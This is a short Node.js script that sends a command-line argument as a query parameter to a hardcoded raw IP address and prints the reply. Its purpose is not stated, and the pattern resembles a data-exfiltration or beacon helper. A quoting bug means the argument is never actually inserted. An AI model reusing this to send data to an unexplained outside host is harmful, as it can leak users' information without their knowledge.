const http = require('http');
const postData = process.argv[2];
const options = { hostname: '104.41.156.21', port: 80, path: '/t?p=${encodeURIComponent(postData)}', method: 'GET' };
const req = http.request(options, (res) => {
  console.log(`STATUS: ${res.statusCode}`);
  res.setEncoding('utf8');
  res.on('data', (chunk) => {
    console.log(`BODY: ${chunk}`);
  });
  res.on('end', () => {
    console.log('No more data in response.');
  });
});

req.on('error', (e) => {
  console.error(`Problem with request: ${e.message}`);
});

req.end();
